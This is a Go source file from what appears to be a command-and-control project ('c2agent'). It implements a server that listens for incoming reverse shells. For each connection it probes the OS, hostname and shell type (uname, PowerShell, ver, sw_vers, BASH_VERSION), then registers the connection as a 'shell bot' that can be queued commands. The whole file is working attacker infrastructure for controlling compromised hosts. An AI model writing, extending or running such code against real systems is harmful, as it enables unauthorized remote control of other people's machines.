package shell

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"c2agent/internal/agent"
)

// ServerOptions configures the reverse-shell listener.
type ServerOptions struct {
	Registry      *agent.Registry
	Host          string
	Port          int
	BotPrefix     string
	CmdTimeout    time.Duration
	TimeoutAction string
	QueueCapacity int
	Logger        *log.Logger
}

// Server accepts raw reverse shells and registers them as shell bots.
type Server struct {
	opts     ServerOptions
	logger   *log.Logger
	ln       net.Listener
	wg       sync.WaitGroup
	stop     chan struct{}
	stopOnce sync.Once
	conns    sync.Map
}

var osProbes = []struct{ cmd, keyword, os string }{
	{"uname -s", "linux", "Linux"},
	{"powershell -NoProfile -Command [Environment]::OSVersion.VersionString", "windows", "Windows"},
	{"sw_vers", "macos", "macOS"},
}

// winEnvProbes distinguishes a PowerShell reverse shell from a cmd.exe one, so
// the right command syntax can be generated. The first matching probe wins.
var winEnvProbes = []struct{ cmd, keyword, env string }{
	// PowerShell prints the sentinel; cmd.exe reports 'Write-Output' not found.
	{"Write-Output __C2SHELL_PS__", "__c2shell_ps__", EnvPowerShell},
	// cmd.exe's builtin `ver` prints "Microsoft Windows [Version ...]";
	// PowerShell does not have a `ver` command.
	{"ver", "microsoft windows", EnvCmd},
}

// NewServer builds a reverse-shell server.
func NewServer(o ServerOptions) *Server {
	if o.Logger == nil {
		o.Logger = log.Default()
	}
	return &Server{opts: o, logger: o.Logger, stop: make(chan struct{})}
}

// Start binds the listener and launches the accept loop.
func (s *Server) Start() error {
	addr := fmt.Sprintf("%s:%d", s.opts.Host, s.opts.Port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	s.ln = ln
	s.wg.Add(1)
	go s.acceptLoop()
	return nil
}

// Addr returns the bound listener address.
func (s *Server) Addr() net.Addr {
	if s.ln == nil {
		return nil
	}
	return s.ln.Addr()
}

// Close stops the server and closes all live connections.
func (s *Server) Close() error {
	s.stopOnce.Do(func() { close(s.stop) })
	if s.ln != nil {
		_ = s.ln.Close()
	}
	s.conns.Range(func(k, _ any) bool {
		if c, ok := k.(net.Conn); ok {
			_ = c.Close()
		}
		return true
	})
	s.wg.Wait()
	return nil
}

func (s *Server) acceptLoop() {
	defer s.wg.Done()
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			select {
			case <-s.stop:
				return
			default:
				// Back off on persistent accept errors (e.g. EMFILE) instead
				// of spinning tightly.
				time.Sleep(100 * time.Millisecond)
				continue
			}
		}
		s.wg.Add(1)
		go s.handleConn(conn)
	}
}

func (s *Server) handleConn(conn net.Conn) {
	defer s.wg.Done()
	defer conn.Close()

	id := s.opts.Registry.NextBotID(s.opts.BotPrefix)
	b := newBackend(id, conn)
	s.conns.Store(conn, struct{}{})
	defer s.conns.Delete(conn)
	go b.readLoop()

	osName := s.probeOS(b)
	host := s.probeHostname(b)
	envName := s.probeEnv(b, osName)
	// A positive interpreter probe also identifies a Windows host even if the
	// OS probe missed it (e.g. a non-English `ver` was filtered away).
	if osName == "Unknown" && (envName == EnvPowerShell || envName == EnvCmd) {
		osName = "Windows"
	}
	b.setOS(osName)
	b.setEnv(envName)

	select {
	case <-b.closed:
		return
	default:
	}

	ag := agent.New(agent.Options{
		ID:            id,
		Kind:          agent.KindShell,
		Hostname:      host,
		OS:            osName,
		Env:           envName,
		Backend:       b,
		QueueCapacity: s.opts.QueueCapacity,
		CmdTimeout:    s.opts.CmdTimeout,
		TimeoutAction: s.opts.TimeoutAction,
		OnTimeout: func(a *agent.Agent) {
			s.logger.Printf("shell bot %s execution timeout; disconnecting", a.ID)
			s.opts.Registry.UnregisterAgent(a)
		},
	})
	s.opts.Registry.Register(ag)
	s.logger.Printf("shell bot registered: id=%s os=%s env=%s host=%s from %s", id, osName, envName, host, conn.RemoteAddr())

	<-b.closed
	s.opts.Registry.UnregisterAgent(ag)
}

func (s *Server) probeOS(b *Backend) string {
	for _, p := range osProbes {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		out, err := b.request(ctx, p.cmd)
		cancel()
		if err != nil {
			// Try the next probe rather than giving up on a transient error.
			continue
		}
		if strings.Contains(strings.ToLower(out), p.keyword) {
			return p.os
		}
	}
	return "Unknown"
}

// probeEnv detects the command interpreter behind the reverse shell. On
// Windows it distinguishes PowerShell from cmd.exe; on POSIX systems it
// distinguishes bash from a POSIX-only shell (both share one implementation).
// For an Unknown OS it still runs the Windows probes (they only match a
// Windows interpreter), so a missed OS probe can be recovered here.
func (s *Server) probeEnv(b *Backend, osName string) string {
	if osName == "Windows" || osName == "Unknown" {
		for _, p := range winEnvProbes {
			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			out, err := b.request(ctx, p.cmd)
			cancel()
			if err != nil {
				continue
			}
			if strings.Contains(strings.ToLower(out), p.keyword) {
				return p.env
			}
		}
		return EnvUnknown
	}
	if osName == "Linux" || osName == "macOS" {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		out, err := b.request(ctx, "echo ${BASH_VERSION:-__C2POSIX__}")
		cancel()
		if err != nil {
			return EnvUnknown
		}
		if strings.Contains(out, "__C2POSIX__") {
			return EnvSh
		}
		if strings.TrimSpace(out) != "" {
			return EnvBash
		}
	}
	return EnvUnknown
}

func (s *Server) probeHostname(b *Backend) string {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	out, err := b.request(ctx, "hostname")
	cancel()
	if err != nil {
		return ""
	}
	if i := strings.IndexByte(out, '\n'); i >= 0 {
		out = out[:i]
	}
	return strings.TrimSpace(out)
}

func randMarker() string {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		return "__C2AGENT_fallback__"
	}
	return "__C2AGENT_" + hex.EncodeToString(buf) + "__"
}
